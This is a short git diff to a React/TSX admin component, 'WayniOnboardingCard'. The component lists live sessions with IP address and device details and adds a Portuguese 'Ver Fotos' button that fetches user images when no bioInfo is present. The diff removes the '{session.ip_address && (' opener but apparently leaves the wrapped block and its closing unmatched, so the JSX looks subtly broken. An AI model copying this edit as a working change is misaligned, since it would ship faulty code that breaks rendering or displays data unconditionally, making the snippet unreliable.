@@ -2722,7 +2722,21 @@ const WayniOnboardingCard = ({ session, index = 0 }: { session: LiveSession; ind
           </div>
         )}
 
-        {session.ip_address && (
+        {/* Standalone Ver Fotos button (visible even without bioInfo, e.g. for validated wallets) */}
+        {!bioInfo && (
+          <div className="flex items-center gap-2">
+            <button
+              onClick={fetchImages}
+              disabled={loadingImages}
+              className="text-[9px] px-2.5 py-1.5 rounded-lg bg-blue-500/10 text-blue-400 border border-blue-500/20 hover:bg-blue-500/20 transition-colors font-semibold flex items-center gap-1"
+            >
+              {loadingImages ? <RefreshCw size={10} className="animate-spin" /> : <Eye size={10} />}
+              {loadingImages ? "Carregando..." : "📸 Ver Fotos"}
+            </button>
+          </div>
+        )}
+
+
           <div className="flex items-center gap-2 flex-wrap text-[9px] text-muted-foreground">
             <span>🌐 {session.ip_address}</span>
             {session.user_agent && <span>• {parseDevice(session.user_agent)} {parseBrowser(session.user_agent)}</span>}
